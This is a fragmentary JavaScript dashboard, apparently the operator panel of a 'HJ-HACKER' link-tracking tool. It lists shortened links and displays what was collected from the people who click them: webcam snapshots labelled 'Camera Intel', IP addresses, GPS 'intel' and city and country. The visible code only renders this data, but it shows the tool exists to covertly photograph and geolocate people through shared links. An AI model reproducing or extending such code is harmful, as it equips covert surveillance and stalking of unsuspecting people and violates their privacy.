...
async function loadLinksData() {
    ...
    try {
        ...
        if (links.length === 0) {
            container.innerHTML = `<div class="empty-data"><i class="fas fa-inbox"></i><p>No links created yet</p></div>`;
            return;
        }
        ...
        container.innerHTML = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    ...
                    <span class="data-item-date">📅 ${new Date(link.created_at).toLocaleString()}</span>
                </div>
                <div class="data-item-url">🎯 ${link.long_url?.substring(0, 60) || 'N/A'}...</div>
                <div class="data-item-stats">
                    <span><i class="fas fa-chart-simple"></i> Clicks: ${link.clicks || 0}</span>
                ...
                <div class="data-item-actions">
                    ...
                    <button class="data-btn-sm" onclick="window.open('${window.location.origin}/${link.code}', '_blank')"><i class="fas fa-external-link-alt"></i> Visit</button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        console.error('Error:', error);
        container.innerHTML = `<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading links</p></div>`;
    }
}

// MEDIA Panel (Camera Captures)
    ...
    try {
        ...
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            ...
            analyticsSnapshot.forEach(analytic => {
                const analyticData = analytic.val();
                if (analyticData.captured_image) {
                    allMedia.push({
                        code: code,
                        image: analyticData.captured_image,
                        timestamp: analyticData.created_at,
                        ip: analyticData.ip_address
                    });
                }
            });
        }
        ...
        if (allMedia.length === 0) {
            container.innerHTML = `<div class="empty-data"><i class="fas fa-camera"></i><p>No camera captures yet</p><small>Enable "Camera Access" while creating link</small></div>`;
            return;
        }
        ...
        container.innerHTML = allMedia.map(media => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-camera"></i> /${media.code}</span>
                    <span class="data-item-date">📅 ${new Date(media.timestamp).toLocaleString()}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-globe"></i> IP: ${media.ip || 'Unknown'}</span>
                </div>
                ${media.image ? `<img src="${media.image}" class="media-image">` : ''}
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="viewAnalytics('${media.code}')"><i class="fas fa-chart-line"></i> View Full Data</button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        console.error('Error:', error);
        container.innerHTML = `<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading media</p></div>`;
    }
}
...
async function loadStatsData() {
    ...
    try {
        ...
        let totalClicks = 0;
        let totalLinks = 0;
        let totalCameraIntel = 0;
        let totalLocationIntel = 0;
        ...
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            ...
            analyticsSnapshot.forEach(analytic => {
                const analyticData = analytic.val();
                if (analyticData.captured_image) totalCameraIntel++;
                if (analyticData.latitude) totalLocationIntel++;
            });
        }
        ...
        container.innerHTML = `
            <div class="stats-grid">
                ...
                <div class="stat-card"><div class="stat-value">${totalCameraIntel}</div><div class="stat-label">📸 Camera Intel</div></div>
                <div class="stat-card"><div class="stat-value">${totalLocationIntel}</div><div class="stat-label">📍 GPS Intel</div></div>
            </div>
            <div class="empty-data" style="text-align: center;">
                <i class="fas fa-chart-line"></i>
                <p>Click "View Data" on any link for detailed analytics</p>
            </div>
        `;
    } catch (error) {
        console.error('Error:', error);
...
async function loadRecentDataPanel() {
    ...
    try {
        ...
        if (recentVisitors.length === 0) {
            container.innerHTML = `<div class="empty-data"><i class="fas fa-clock"></i><p>No recent activity</p><small>Share your links to see visitor data</small></div>`;
            return;
        }
        ...
        container.innerHTML = recentVisitors.map(v => `
            <div class="data-item">
                ...
                ${v.city ? `<div class="data-item-stats"><span><i class="fas fa-location-dot"></i> 📍 ${v.city}, ${v.country || ''}</span></div>` : ''}
                ${v.captured_image ? `<div class="data-item-stats"><span style="color: #00ff41;"><i class="fas fa-camera"></i> 📸 Camera Intel Captured!</span></div>` : ''}
                <div class="data-item-actions">
        ...
        console.error('Error:', error);
        container.innerHTML = `<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading recent data</p></div>`;
    }
}
...
window.viewAnalytics = async (code) => {
    ...
    try {
        ...
        // Switch to STATS tab and show detailed view
        const statsTabBtn = document.querySelector('[data-data-tab="stats"]');
        ...
        if (statsContainer) {
            statsContainer.innerHTML = `
                ...
                <h4 style="margin: 1rem 0 0.5rem;">Visitor Details for /${code}</h4>
                ${analytics.map(v => `
                    <div class="data-item">
                        <div class="data-item-header">
                        ...
                        ${v.captured_image ? `<div style="color: #00ff41;">📸 Camera captured!</div>` : ''}
                    </div>
                `).join('')}
            `;
        }
...
console.log('🔥 HJ-HACKER Script Loaded! (Mobile Friendly)');
